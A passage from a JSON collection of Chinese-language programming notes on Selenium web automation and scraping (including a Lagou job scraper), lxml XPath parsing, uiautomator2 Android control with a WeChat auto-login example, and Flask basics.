如果没有在环境变量指定PhantomJS位置\n# driver = webdriver.PhantomJS(executable_path=\"./phantomjs\"))\n\n# get方法会一直等到页面被完全加载，然后才会继续程序，通常测试会在这里选择 time.sleep(2)\ndriver.get(\"http://www.baidu.com/\")\n\n# 获取页面名为 wrapper的id标签的文本内容\ndata = driver.find_element_by_id(\"wrapper\").text\n\n# 打印数据内容\nprint data\n\n# 打印页面标题 \"百度一下，你就知道\"\nprint driver.title\n\n# 生成当前页面快照并保存\ndriver.save_screenshot(\"baidu.png\")\n\n# id=\"kw\"是百度搜索输入框，输入字符串\"长城\"\ndriver.find_element_by_id(\"kw\").send_keys(u\"长城\")\n\n# id=\"su\"是百度搜索按钮，click() 是模拟点击\ndriver.find_element_by_id(\"su\").click()\n\n# 获取新的页面快照\ndriver.save_screenshot(\"长城.png\")\n\n# 打印网页渲染后的源代码\nprint driver.page_source\n\n# 获取当前页面Cookie\nprint driver.get_cookies()\n\n# 调用键盘按键操作时需要引入的Keys包\nfrom selenium.webdriver.common.keys import Keys\n\n# ctrl+a 全选输入框内容\ndriver.find_element_by_id(\"kw\").send_keys(Keys.CONTROL,'a')\n\n# ctrl+x 剪切输入框内容\ndriver.find_element_by_id(\"kw\").send_keys(Keys.CONTROL,'x')\n\n# 输入框重新输入内容\ndriver.find_element_by_id(\"kw\").send_keys(\"itcast\")\n\n# 模拟Enter回车键\ndriver.find_element_by_id(\"su\").send_keys(Keys.RETURN)\n\n# 清除输入框内容\ndriver.find_element_by_id(\"kw\").clear()\n\n# 生成新的页面快照\ndriver.save_screenshot(\"itcast.png\")\n\n# 获取当前url\nprint driver.current_url\n\n# 关闭当前页面，如果只有一个页面，会关闭浏览器\n# driver.close()\n\n# 关闭浏览器\ndriver.quit()\n```\n\n## 关闭页面\n1. driver.close(): 关闭当前页面\n2. driver.quit(): 退出整个浏览器\n\n## 定位UI元素 (WebElements)\nSelenium中提供的获取UI元素的API底层都是python实现的，而lxml底层是由c实现的，所以使用Selenium获取元素没有lxml快。所以如果我们只是想要解析网页中的数据，那么我们一般都是使用如下代码来定位UI元素的\n```python\n# driver.page_source获取的与你再浏览器中按F12\nhtml = etree.HTML(dirver.page_source)\nhtml.xpath(\"***\")\n```\n但如果是想要对元素进行一些操作，比如给一个文本框输入值，或者是点击某个按钮，那么就必须使用selenium给我们提供的查找元素的方法，因为只有通过selenium获取的元素的对象才有selenium提过的对元素操作的方法\n\nSelenium 的 WebDriver提供了各种方法来寻找元素，假设下面有一个表单输入框：\n```python\n<input type=\"text\" name=\"user-name\" id=\"passwd-id\" />\n```\n那么：\n```python\n# 通过id来找元素\nelement = driver.find_element_by_id(\"passwd-id\")\n# 通过name来找元素\nelement = driver.find_element_by_name(\"user-name\")\n# 通过tagname来找元素\nelement = driver.find_elements_by_tag_name(\"input\")\n# 也可以通过XPath来匹配， 注意这个xpaht只不能查找文本内容，即不能使用text()\nelement = driver.find_element_by_xpath(\"//input[@id='passwd-id']\")\n```\n关于元素的选取，有如下的API 单个元素选取 \t\n```\nfind_element_by_id\nfind_elements_by_name\nfind_elements_by_xpath\nfind_elements_by_link_text\nfind_elements_by_partial_link_text\nfind_elements_by_tag_name\nfind_elements_by_class_name\nfind_elements_by_css_selector\n```\n\n## WebElement元素\nfrom selenius.webdriver.remote.webelement import webElement 类是每个获取出来的元素的所展类。\n有一些常用的属性：\n1. get_attribute；这个标签的某个属性的值。\n2. screentshot：获取当前页面的截图。这个方法只能在driver 上使用。\n   driver的对象类，也是继承自 webElement。\n   更多请阅读相关源代码。\n\n## 鼠标动作链\n有些时候，我们需要再页面上模拟一些鼠标操作，比如双击、右击、拖拽甚至按住不动等，我们可以通过导入 ActionChains 类来做到：\n\n更多方法请参考：http://selenium-python.readthedocs.io/api.html\n示例：\n```python\n#导入 ActionChains 类\nfrom selenium.webdriver import ActionChains\n\n# 鼠标移动到 ac 位置\nac = driver.find_element_by_xpath('element')\nActionChains(driver).move_to_element(ac).perform()\n\n# 在 ac 位置单击\nac = driver.find_element_by_xpath(\"elementA\")\nActionChains(driver).move_to_element(ac).click(ac).perform()\n\n# 在 ac 位置双击\nac = driver.find_element_by_xpath(\"elementB\")\nActionChains(driver).move_to_element(ac).double_click(ac).perform()\n\n# 在 ac 位置右击\nac = driver.find_element_by_xpath(\"elementC\")\nActionChains(driver).move_to_element(ac).context_click(ac).perform()\n\n# 在 ac 位置左键单击hold住\nac = driver.find_element_by_xpath('elementF')\nActionChains(driver).move_to_element(ac).click_and_hold(ac).perform()\n\n# 将 ac1 拖拽到 ac2 位置\nac1 = driver.find_element_by_xpath('elementD')\nac2 = driver.find_element_by_xpath('elementE')\nActionChains(driver).drag_and_drop(ac1, ac2).perform()\n```\n\n## 操作表单元素\n1. 操作输入框：分为两步。第一步：找到这个元素。第二步：使用send_keys（value），将数据填充进去。示例代码如下：\n```python\n# 获取输入框\ninput = driver.find_element_by_id('kw')\n\n# 给输入框中填写数据\ninput.send_keys('fffk')\n\n# 清空输入框中的内容\ninput.clear()\n```\n\n2. 操作checkbox：因为要选中checkbox标签，在网页中是通过鼠标点击的。因此想要选中checkbox标签，那么先选中这个标签，然后执行click事件。示例代码如下：\n```python\nrememberTag = driver.find_element_by_name('rememberMe')\nrememberTag.click()\n```\n\n3. 操作select: 我们已经知道了怎样向文本框中输入文字，但是有时候我们会碰到`<select> </select>`标签的下拉框。直接点击下拉框中的选项不一定可行。\n```html\n<select id=\"status\" class=\"form-control valid\" onchange=\"\" name=\"status\">\n    <option value=\"\"></option>\n    <option value=\"0\">未审核</option>\n    <option value=\"1\">初审通过</option>\n    <option value=\"2\">复审通过</option>\n    <option value=\"3\">审核不通过</option>\n</select>\n```\n\nSelenium专门提供了Select类来处理下拉框。 其实 WebDriver 中提供了一个叫 Select 的方法，可以帮助我们完成这些事情：\n```python\n# 导入 Select 类\nfrom selenium.webdriver.support.ui import Select\n\n# 找到 name 的选项卡\nselect = Select(driver.find_element_by_name('status'))\n\n# \nselect.select_by_index(1)\nselect.select_by_value(\"0\")\nselect.select_by_visible_text(u\"未审核\")\n```\n\n以上是三种选择下拉框的方式，它可以根据索引来选择，可以根据值来选择，可以根据文字来选择。注意：\n- index 索引从 0 开始\n- value是option标签的一个属性值，并不是显示在下拉框中的值\n- visible_text是在option标签文本的值，是显示在下拉框的值\n全部取消选择怎么办呢？很简单:\n```python\nselect.deselect_all()\n```\n\n## 弹窗处理\n当你触发了某个事件之后，页面出现了弹窗提示，处理这个提示或者获取提示信息方法如下：\n```python\nalert = driver.switch_to_alert()\n```\n\n## 页面切换\n一个浏览器肯定会有很多窗口，所以我们肯定要有方法来实现窗口的切换。切换窗口的方法如下：\n```python\n# 打开一个新的页面\ndriver.execute_script('window.open('www.baidu.com')')\n# 查看当前driver所在的页面, 会发现虽然打开了baidu.com新页面，并且浏览器展示的也是baidu页面，但是此时dirver所在的url还是以前的url，而不是baidu.com\nprint(driver.current_url)\n\n# 切换到这个新的页面中\ndriver.switch_to.window(driver.window_handles[1])\n# 查看当前driver所在的页面\nprint(driver.current_url)\n```\n\n也可以使用 window_handles 方法来获取每个窗口的操作对象。例如：\n```python\nfor handle in driver.window_handles:\n    driver.switch_to_window(handle)\n```\n\n## 页面前进和后退\n操作页面的前进和后退功能：\n```python\ndriver.forward()     #前进\ndriver.back()        # 后退\n```\n\n## Cookies\n获取页面每个Cookies值，用法如下\n```python\nfor cookie in driver.get_cookies():\n    print \"%s=%s;\" % (cookie['name'], cookie['value'])\n```\n根据cookie的key获取value\n```python\nvalue = driver.get_cookie(key)\n```\n\n删除Cookies，用法如下\n```python\n# By name\ndriver.delete_cookie(\"BAIDUID\")\n\n# all\ndriver.delete_all_cookies()\n```\n\n## 设置代理IP\n有时候频繁爬取一些网页。服务器发现你是爬虫后会封掉你的ip地址。这时候我们可以更改代理ip。更改代理ip，不同的浏览器有不同的实现方式。这里以Chrome 浏览器为例来讲解：\n```python\nfrom selenium import webdriver\n\noptions = webdriver.ChromeOptions()\noptions.add_argument(\"--proxy-server=http://110.23.44.3.9999\")\ndriver_path = r\"F:\\chromedriver.exe\"\ndriver = webdriver.Chrome(executable_path=driver_path, chrome_options = options)\n\ndriver.get('http://httpbin.org/bin')\n```\n\n## 页面等待\n现在的网页越来越多采用了 Ajax 技术，这样程序便不能确定何时某个元素完全加载出来了。如果实际页面等待时间过长导致某个dom元素还没出来，但是你的代码直接使用了这个WebElement，那么就会抛出NullPointer的异常。\n\n为了避免这种元素定位困难而且会提高产生 ElementNotVisibleException 的概率。所以 Selenium 提供了两种等待方式，一种是隐式等待，一种是显式等待。\n\n隐式等待是等待特定的时间，显式等待是指定某一条件直到这个条件成立时继续执行。\n\n### 显式等待\n显式等待指定某个条件，然后设置最长等待时间。如果在这个时间还没有找到元素，那么便会抛出异常了。\n```python\nfrom selenium import webdriver\nfrom selenium.webdriver.common.by import By\n# WebDriverWait 库，负责循环等待\nfrom selenium.webdriver.support.ui import WebDriverWait\n# expected_conditions 类，负责条件出发\nfrom selenium.webdriver.support import expected_conditions as EC\n\ndriver = webdriver.PhantomJS()\ndriver.get(\"http://www.xxxxx.com/loading\")\ntry:\n    # 每隔10秒查找页面元素 id=\"myDynamicElement\"，直到出现则返回, 会阻塞\n    element = WebDriverWait(driver, 10).until(\n        EC.presence_of_element_located((By.ID, \"myDynamicElement\"))\n      )\nfinally:\n    driver.quit()\n```\n\n如果不写参数，程序默认会 0.5s 调用一次来查看元素是否已经生成，如果本来元素就是存在的，那么会立即返回。\n\n下面是一些内置的等待条件，你可以直接调用这些条件，而不用自己写某些等待条件了。\n```\ntitle_is\ntitle_contains\npresence_of_element_located: 某个元素已经加载完毕了\nvisibility_of_element_located\nvisibility_of\npresence_of_all_elements_located： 网页中所有满足条件的元素都加载完毕了\ntext_to_be_present_in_element\ntext_to_be_present_in_element_value\nframe_to_be_available_and_switch_to_it\ninvisibility_of_element_located\nelement_to_be_clickable：某个元素是可以点击了\nstaleness_of\nelement_to_be_selected\nelement_located_to_be_selected\nelement_selection_state_to_be\nelement_located_selection_state_to_be\nalert_is_present\n```\n\n### 隐式等待\n隐式等待比较简单，就是简单地设置一个等待时间，单位为秒。\n```python\nfrom selenium import webdriver\n\ndriver = webdriver.PhantomJS()\ndriver.implicitly_wait(10) # seconds\ndriver.get(\"http://www.xxxxx.com/loading\")\nmyDynamicElement = driver.find_element_by_id(\"myDynamicElement\")\n```\n当然如果不设置，默认等待时间为0。\n\n# 拉钩网实战\n```python\nfrom selenium import webdriver\nfrom lxml import etree\nimport re\nimport time\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.support import expected_conditions as EC\nfrom selenium.webdriver.common.by import By\n\nclass LagouSpider(object):\n    driver_path = r\"D:\\ProgramApp\\chromedriver\\chromedriver.exe\"\n    def __init__(self):\n        self.driver = webdriver.Chrome(executable_path=LagouSpider.driver_path)\n        self.url = 'https://www.lagou.com/jobs/list_python?labelWords=&fromSearch=true&suginput='\n        self.positions = []\n\n    def run(self):\n        self.driver.get(self.url)\n        while True:\n            source = self.driver.page_source\n            WebDriverWait(driver=self.driver,timeout=10).until(\n                EC.presence_of_element_located((By.XPATH,\"//div[@class='pager_container']/span[last()]\"))\n            )\n            self.parse_list_page(source)\n            try:\n                next_btn = self.driver.find_element_by_xpath(\"//div[@class='pager_container']/span[last()]\")\n                if \"pager_next_disabled\" in next_btn.get_attribute(\"class\"):\n                    break\n                else:\n                    next_btn.click()\n            except:\n                print(source)\n            time.sleep(1)\n\n    def parse_list_page(self,source):\n        html = etree.HTML(source)\n        links = html.xpath(\"//a[@class='position_link']/@href\")\n        for link in links:\n            self.request_detail_page(link)\n            time.sleep(1)\n\n    def request_detail_page(self,url):\n        # self.driver.get(url)\n        self.driver.execute_script(\"window.open('%s')\"%url)\n        self.driver.switch_to.window(self.driver.window_handles[1])\n        WebDriverWait(self.driver,timeout=10).until(\n            EC.presence_of_element_located((By.XPATH,\"//div[@class='job-name']/span[@class='name']\"))\n        )\n        source = self.driver.page_source\n        self.parse_detail_page(source)\n        # 关闭当前这个详情页\n        self.driver.close()\n        # 继续切换回职位列表页\n        self.driver.switch_to.window(self.driver.window_handles[0])\n\n\n    def parse_detail_page(self,source):\n        html = etree.HTML(source)\n        position_name = html.xpath(\"//span[@class='name']/text()\")[0]\n        job_request_spans = html.xpath(\"//dd[@class='job_request']//span\")\n        salary = job_request_spans[0].xpath('.//text()')[0].strip()\n        city = job_request_spans[1].xpath(\".//text()\")[0].strip()\n        city = re.sub(r\"[\\s/]\", \"\", city)\n        work_years = job_request_spans[2].xpath(\".//text()\")[0].strip()\n        work_years = re.sub(r\"[\\s/]\", \"\", work_years)\n        education = job_request_spans[3].xpath(\".//text()\")[0].strip()\n        education = re.sub(r\"[\\s/]\", \"\", education)\n        desc = \"\".join(html.xpath(\"//dd[@class='job_bt']//text()\")).strip()\n        company_name = html.xpath(\"//h2[@class='fl']/text()\")[0].strip()\n        position = {\n            'name': position_name,\n            'company_name': company_name,\n            'salary': salary,\n            'city': city,\n            'work_years': work_years,\n            'education': education,\n            'desc': desc\n        }\n        self.positions.append(position)\n        print(position)\n        print('='*40)\n\n\nif __name__ == '__main__':\n    spider = LagouSpider()\n    spider.run()\n\n```\n"
  },
  {
    "title": "./notes/python库/lxml.md",
    "body": "# 简介\nlxml 是 一个HTML/XML的解析器，主要的功能是如何解析和提取 HTML/XML 数据。\nlxml和正则一样，也是用C实现的，是一款高性能的 Python HTML/XML 解析器，我们可以利用之前学习的XPath语法，来快速的定位特定元素以及节点信息。\nlxml python 官方文档：http://lxml.de/index.html\n需要安装C语言库，可使用 pip 安装：`pip install lxml` （或通过wheel方式安装）\n\nlxml.etree中常用函数：\n- `HTML函数`\n- `tostring函数`\n- `parse函数`\n- `HTMLParser函数`\n\n# 初步使用\n我们利用它来解析 HTML 代码，简单示例：\n```python\n# 使用 lxml 的 etree 库\nfrom lxml import etree \ntext = '''\n<div>\n    <ul>\n         <li class=\"item-0\"><a href=\"link1.html\">first item</a></li>\n         <li class=\"item-1\"><a href=\"link2.html\">second item</a></li>\n         <li class=\"item-inactive\"><a href=\"link3.html\">third item</a></li>\n         <li class=\"item-1\"><a href=\"link4.html\">fourth item</a></li>\n         <li class=\"item-0\"><a href=\"link5.html\">fifth item</a> # 注意，此处缺少一个 </li> 闭合标签\n     </ul>\n </div>\n'''\n\n#利用etree.HTML，将字符串解析为HTML文档\nhtml = etree.HTML(text) \n\n# 按字符串序列化HTML文档, result不是字符串\nresult = etree.tostring(html) \n\nprint(result)\n```\n\n输出结果：\n```html\n<html><body>\n<div>\n    <ul>\n         <li class=\"item-0\"><a href=\"link1.html\">first item</a></li>\n         <li class=\"item-1\"><a href=\"link2.html\">second item</a></li>\n         <li class=\"item-inactive\"><a href=\"link3.html\">third item</a></li>\n         <li class=\"item-1\"><a href=\"link4.html\">fourth item</a></li>\n         <li class=\"item-0\"><a href=\"link5.html\">fifth item</a></li>\n</ul>\n </div>\n</body></html>\n```\nlxml 可以自动修正 html 代码，例子里不仅补全了 li 标签，还添加了 body，html 标签。\n\n# 文件读取：\n除了直接读取字符串，lxml还支持从文件里读取内容。我们新建一个hello.html文件：\n\n```html\n<div>\n    <ul>\n         <li class=\"item-0\"><a href=\"link1.html\">first item</a></li>\n         <li class=\"item-1\"><a href=\"link2.html\">second item</a></li>\n         <li class=\"item-inactive\"><a href=\"link3.html\"><span class=\"bold\">third item</span></a></li>\n         <li class=\"item-1\"><a href=\"link4.html\">fourth item</a></li>\n         <li class=\"item-0\"><a href=\"link5.html\">fifth item</a></li>\n     </ul>\n </div>\n```\n\n再利用etree.parse()方法来读取文件。\n```python\nfrom lxml import etree\n\n# 读取外部文件 hello.html\nparser = etree.HTMLParser(encoding='utf-8')\nhtml = etree.parse('./hello.html', parser=parser)\n\nresult = etree.tostring(html, pretty_print=True)\n\nprint(result)\n```\n\n输出结果与之前相同：\n```html\n<html><body>\n<div>\n    <ul>\n         <li class=\"item-0\"><a href=\"link1.html\">first item</a></li>\n         <li class=\"item-1\"><a href=\"link2.html\">second item</a></li>\n         <li class=\"item-inactive\"><a href=\"link3.html\">third item</a></li>\n         <li class=\"item-1\"><a href=\"link4.html\">fourth item</a></li>\n         <li class=\"item-0\"><a href=\"link5.html\">fifth item</a></li>\n</ul>\n </div>\n</body></html>\n```\n# lxml使用XPATH语法\n**1. 获取所有的 `<li>` 标签**\n```python\nfrom lxml import etree\n\nhtml = etree.parse('hello.html')\nprint type(html)  # 显示etree.parse() 返回类型\n\n# result是列表\nresult = html.xpath('//li')\n\nprint result  # 打印<li>标签的元素列表\nprint len(result)\nprint type(result)\nprint type(result[0])\n```\n\n输出结果：\n```\n<type 'lxml.etree._ElementTree'>\n[<Element li at 0x1014e0e18>, <Element li at 0x1014e0ef0>, <Element li at 0x1014e0f38>, <Element li at 0x1014e0f80>, <Element li at 0x1014e0fc8>]\n5\n<type 'list'>\n<type 'lxml.etree._Element'>\n```\n\n**2. 继续获取`<li>` 标签的所有 `class`属性**\n```python\nfrom lxml import etree\n\nhtml = etree.parse('hello.html')\nresult = html.xpath('//li/@class')\n\nprint result\n```\n\n运行结果\n```\n['item-0', 'item-1', 'item-inactive', 'item-1', 'item-0']\n```\n\n**3. 继续获取`<li>`标签下`hre` 为 `link1.html` 的 `<a>` 标签**\n```python\nfrom lxml import etree\n\nhtml = etree.parse('hello.html')\nresult = html.xpath('//li/a[@href=\"link1.html\"]')\n\nfor tr in result:\n    print(etree.tostring(tr, encoding='utf-8').decode('utf-8'))\n```\n"
  },
  {
    "title": "./notes/python库/uiautomator2.md",
    "body": "# uiautomator2简介\n通过这个python库可以实现客户端控制手机\n[官网介绍](https://github.com/openatx/uiautomator2)\n\n## 安装`uiautomator2`\n```\npip3 install uiautomator2\n```\n\n安装完后用usb与手机相互连接， 然后运行`python3 -m uiautomator2 init`来启动uiautomator2,如果是第一次使用该命令，则它会在手机安装如下东西\n```\napp-uiautomator.apk\napp-uiautomator-test.apk\natx-agent\nminicap\nminitouch\n```\n并且其会安装上面的2个apk, 该应用界面如下\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20200112135353.png\"/>\n然后点击启动UIAUTOMATOR\n注： 如果没有在命令行中运行`python3 -m uiautomator2 init`命令，则手机是无法启动UIAUTOMATOR的\n以上操作是为了开启手机的UIAUTOMATOR, 只有开启后，电脑才能通过uiautomator2来操作手机\n<font color=\"red\">手机上启动UIAUTOMATOR后， 就可以将手机与电脑断开连接， 因为Uiautomator2可以通过ip地址来操作手机</font>\n\n## 卸载`uiautomator2`\n```\nadb shell rm /data/local/tmp/minicap\nadb shell rm /data/local/tmp/minicap.so\nadb shell rm /data/local/tmp/minitouch\nadb shell /data/local/tmp/atx-agent server --stop\nadb shell rm /data/local/tmp/atx-agent\nadb uninstall com.github.uiautomator\nadb uninstall com.github.uiautomator.test\n```\n\n## 常见方法\n[官网链接](https://github.com/openatx/uiautomator2/blob/master/QUICK_REFERENCE.md)\n```python\nimport uiautomator2 as u2\n\nd = u2.connect(\"--serial-here--\") # 只有一个设备也可以省略参数\nd = u2.connect() # 一个设备时\nd = u2.connect(\"10.1.2.3\") # 通过设备的IP连接(需要在同一局域网且设备上的atx-agent已经安装并启动)\n\nd.app_current() # 获取前台应用 packageName, activity\nd.app_start(\"com.example.app\") # 启动应用\nd.app_start(\"com.example.app\", stop=True) # 启动应用前停止应用\nd.app_stop(\"com.example.app\") # 停止应用\n\napp = d.session(\"com.example.app\") # 启动应用并获取session\n\n# session的用途是操作的同时监控应用是否闪退，当闪退时操作，会抛出SessionBrokenError\napp.click(10, 20) # 坐标点击\n\n# 无session状态下操作\nd.click(10, 20) # 坐标点击\nd.swipe(10, 20, 80, 90) # 从(10, 20)滑动到(80, 90)\nd.swipe_ext(\"right\") # 整个屏幕右滑动\nd.swipe_ext(\"right\", scale=0.9) # 屏幕右滑，滑动距离为屏幕宽度的90%\n\nd.press(\"back\") # 模拟点击返回键\nd.press(\"home\") # 模拟Home键\n\nd.send_keys(\"hello world\") # 模拟输入，需要光标已经在输入框中才可以\nd.clear_text() # 清空输入框\n\n# 执行shell命令\noutput, exit_code = d.shell(\"ps -A\", timeout=60) # 执行shell命令，获取输出和exitCode\noutput = d.shell(\"pwd\").output # 这样也可以\nexit_code = d.shell(\"pwd\").exit_code # 这样也可以\n\n# 元素操作\nd.xpath(\"立即开户\").wait() # 等待元素，最长等10s（默认）\nd.xpath(\"立即开户\").wait(timeout=10) # 修改默认等待时间\n\n# 常用配置\nd.settings['wait_timeout'] = 20 # 控件查找默认等待时间(默认20s)\n\n# xpath操作\nd.xpath(\"立即开户\").click() # 包含查找等待+点击操作，匹配text或者description等于立即开户的按钮\nd.xpath(\"//*[@text='私人FM']/../android.widget.ImageView\").click()\n\nd.xpath('//*[@text=\"私人FM\"]').get().info # 获取控件信息\n\nfor el in d.xpath('//android.widget.EditText').all():\n    print(\"rect:\", el.rect) # output tuple: (left_x, top_y, width, height)\n    print(\"bounds:\", el.bounds) # output tuple: （left, top, right, bottom)\n    print(\"center:\", el.center())\n    el.click() # click operation\n    print(el.elem) # 输出lxml解析出来的Node\n\n# 监控弹窗(在线程中监控)\nd.watcher.when(\"跳过\").click()\nd.watcher.start()\n```\n\n## 实战: 实现微信自动登录\n### 使用可视化工具`weditor`\nwebditor是一个可视化安卓调试工具，一般用于获取页面控件的定位的\n<font color=\"red\"> 注： 在使用`weditor`时， 一定要先启动`UIAUTOMATOR` </font>\n```\npip3 install -U weditor\n```\n使用命令`python -m weditor`来启动， 此时会自动打开浏览器， 输入设备的ip后序列号（可通过adb devices查看）， 点击Connect即可\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20200112135655.png\"/>\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20200112165431.png\"/>\n\n### 使用`apowermirror`\napowermirror是用来将手机投屏到电脑上的，需要在手机与电脑上安装`apowermirror`, 该软件有2中方法实现连接： USB与wifi。\n注： 在使用USB方法连接时， 由于`apowermirror`会启动该软件自己的有关adb服务， 这就可能会该adb版本与本机安装的adb版本不一致的问题，如果不一致的话， 从而后导致后面如果用本机的adb进行调试时，会出现`adb server version (31) doesn't match this client (36) adb server version (32) doesn't match this client (36); killing...`问题， 此时`apowermirror`会自动断开连接\n而使用wifi方式进行连接时，是没有这个问题的， 所以建议使用wifi进行连接\n[有关使用wifi连接时， 后自动自动退出的解决方法](https://www.apowersoft.cn/community/topic/30945402.html)\n\n### 编写代码\n虽然不需要打开开发者模式， 但是一定要将开发者模式中的`USB debugging`与`USB simulated input`选项打开， 否则会运行代码是会报错：`java.lang.SecurityException: Injecting to another application requires INJECT_EVENTS permission`， 可以通过ATX软件中的开发者选项进入开发者选项\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20200112164445.png\"/>\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20200112152730.png\"/>\n\n```python\nimport uiautomator2\nfrom passwd import passwd\n\n# connect phone\nd = uiautomator2.connect(\"10.142.254.197\")\n\n# 下面代码都有有阻塞功能，一定要找到元素并实现功能后才执行下一步\nd.xpath('//*[@resource-id=\"com.bbk.launcher2:id/shortcut_application_zone2\"]/android.widget.RelativeLayout[1]/android.widget.ImageView[1]').click()\n\nd(resourceId=\"com.bbk.launcher2:id/item_title\", text=\"WeChat\").click()\n\nd(resourceId=\"com.tencent.mm:id/m7\").set_text(passwd)\n\nd(resourceId=\"com.tencent.mm:id/d17\").click()\n```\n效果：\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20200112170925.gif\"/>"
  },
  {
    "title": "./notes/python库/flask.md",
    "body": "# 简介\nFlask是一个Python编写的Web 微框架，让我们可以使用Python语言快速实现一个网站或Web服务。本文参考自Flask官方文档，大部分代码引用自官方文档。\n\n# 安装Flask\n首先我们来安装Flask。最简单的办法就是使用pip。\n```\npip install flask\n```\n然后打开一个Python文件，输入下面的内容并运行该文件。然后访问localhost:5000，我们应当可以看到浏览器上输出了Hello Flask!。\n```py\nfrom flask import Flask\n\napp = Flask(__name__)\n\n@app.route('/')\ndef hello_world():\n    return 'Hello Flask!'\n\nif __name__ == '__main__':\n    app.run()\n```\n\n# 调试模式\n我们修改代码中的输出，然后查看浏览器上是否有变化。如果你照做的话，可以看到什么变化都没有。其实Flask内置了调试模式，可以自动重载代码并显示调试信息。这需要我们开启调试模式，方法很简单，设置`FLASK_DEBUG`环境变量，并将值设置为1。\n然后再次运行程序，会看到有这样的输出。这时候如果再次修改代码，会发现这次Flask会自动重启。\n```\n * Restarting with stat\n * Debugger is active!\n * Debugger PIN: 157-063-180\n * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)\n```\n\n# 路由\n在上面的例子里可以看到路由的使用。如果了解Spring Web MVC的话，应该对路由很熟悉。路由通过使用Flask的app.route装饰器来设置，这类似Java的注解。\n```py\n@app.route('/')\ndef index():\n    return 'Index Page'\n\n@app.route('/hello')\ndef hello():\n    return 'Hello, World'\n```\n\n# 路径变量\n如果希望获取`/article/1`这样的路径参数，就需要使用路径变量。路径变量的语法是`/path/<converter:varname>`。在路径变量前还可以使用可选的转换器，有以下几种转换器。\n\n| 转换器 | 作用                                     |\n| ------ | ---------------------------------------- |\n| string | 默认选项，接受除了斜杠之外的字符串       |\n| int    | 接受整数                                 |\n| float  | 接受浮点数                               |\n| path   | 和string类似，不过可以接受带斜杠的字符串 |\n| any    | 匹配任何一种转换器                       |\n| uuid   | 接受UUID字符串                           |\n\n下面是Flask官方的例子。\n```py\n@app.route('/user/<username>')\ndef show_user_profile(username):\n    # show the user profile for that user\n    return 'User %s' % username\n\n@app.route('/post/<int:post_id>')\ndef show_post(post_id):\n    # show the post with the given id, the id is an integer\n    return 'Post %d' % post_id\n```\n\n# 构造URL\n在Web程序中常常需要获取某个页面的URL，在Flask中需要使用url_for('方法名')来构造对应方法的URL。下面是Flask官方的例子。\n```\n>>> from flask import Flask, url_for\n>>> app = Flask(__name__)\n>>> @app.route('/')\n... def index(): pass\n...\n>>> @app.route('/login')\n... def login(): pass\n...\n>>> @app.route('/user/<username>')\n... def profile(username): pass\n...\n>>> with app.test_request_context():\n...  print url_for('index')\n...  print url_for('login')\n...  print url_for('login', next='/')\n...  print url_for('profile', username='John Doe')\n...\n/\n/login\n/login?next=/\n/user/John%20Doe\n```\n\n# HTTP方法\n如果需要处理具体的HTTP方法，在Flask中也很容易，使用route装饰器的methods参数设置即可。\n```py\nfrom flask import request\n\n@app.route('/login', methods=['GET', 'POST'])\ndef login():\n    if request.method == 'POST':\n        do_the_login()\n    else:\n        show_the_login_form()\n```\n\n# 静态文件\nWeb程序中常常需要处理静态文件，在Flask中需要使用url_for函数并指定static端点名和文件名。在下面的例子中，实际的文件应放在static/文件夹下。\n```py\nurl_for('static', filename='style.css')\n```\n\n# 处理请求\n在 Flask 中获取请求参数需要使用request等几个全局对象，但是这几个全局对象比较特殊，它们是 Context Locals ，其实就是 Web 上下文中局部变量的代理。虽然我们在程序中使用的是全局变量，但是对于每个请求作用域，它们都是互不相同的变量。理解了这一点，后面就非常简单了。\n\n# Request对象\n对于 Web 应用，与客户端发送给服务器的数据交互至关重要。在 Flask 中由全局的 request 对象来提供这些信息，比如说GET在url后面追加参数、POST在body中带参数、又或者是POST的表单提交方式，这时候就需要从request里提取出参数。\n\nrequest常用的属性和方法\n| 属性    | 用途                           | 类型                   |\n| ------- | ------------------------------ | ---------------------- |\n| data    | 记录请求的数据，并转化成字符串 | *                      |\n| form    | 记录请求中的表单数据           | MultiDict              |\n| args    | 记录url中的查询参数            | MultiDict              |\n| json    | 记录请求中的json数据           |                        |\n| cookies | 记录请求中的cookies信息        | Dict                   |\n| headers | 记录请求报文头                 | EnvironHeaders         |\n| method  |                                | 记录请求使用的HTTP方法 | GET/POST/… |\n| files   | 记录上传的文件                 | *                      |\n| url     | 记录请求的URL地址              | string                 |\n\n## form\n从POST或者PUT请求中解析表单数据。如果GET请求将表单数据编码到url里面，而不是放在表单中传输过来的信息，则不能使用form捕捉。使用form解析后是ImmutableMultiDict(一键多值字典)类型。\n\n## args\n获得url中携带的params(参数)，与传输方式（GET or POST）无关。有时候POST请求也会将参数加入到url中，这种情况下也可以得到args属性。使用args解析后也是ImmutableMultiDict(一键多值字典)类型。\nform和args的例子：\n浏览器默认的将GET请求的表单数据编码到url中，而不会单独发送表单数据。POST请求的表单通过表单数据传到服务端，而不会编码到url中。利用浏览器这样的特性，就可以通过以下这个例子认识到form和args的区别：\n\n## json\n如果请求的mimetype是application/json，那么这个参数将会解析json数据，如果不是将会返回None，可以代替上面的get_json()方法。\n```py\nfrom flask import request\n\n@app.route('/login', methods=['POST', 'GET'])\ndef login():\n    error = None\n    if request.method == 'POST':\n        if valid_login(request.form['username'],\n                       request.form['password']):\n            return log_the_user_in(request.form['username'])\n        else:\n            error = 'Invalid username/password'\n    # the code below is executed if the request method\n    # was GET or the credentials were invalid\n    return render_template('login.html', error=error)\n```\n如果数据是由GET方法传送过来的，可以使用args属性获取，这个属性也是一个字典。\n```py\nsearchword = request.args.get('key', '')\n```\n\n## axios与flask搭配实现文件上传\n前端：\n```js\nupdate() {\n    let param = new FormData();\n     \n    param.append('file', this.fileList2[0])\n\n    this.fileList2.forEach(item => {\n        param.append('files', item.raw)\n    })\n\n    let config = {\n    headers: {'Content-Type': 'multipart/form-data'},\n    responseType: 'blob'\n    };\n    //this.get_log()\n    $http.post('http://127.0.0.1:5000/price_excel/import', param, config)\n        .then(resp => {\n        this.stopTimer = false;\n        this.onSuccess()\n        let data = resp.data;\n        let blob = new Blob([data], {type: 'application/vnd.ms-excel'});\n        let downloadElement = document.createElement('a');\n        let href = 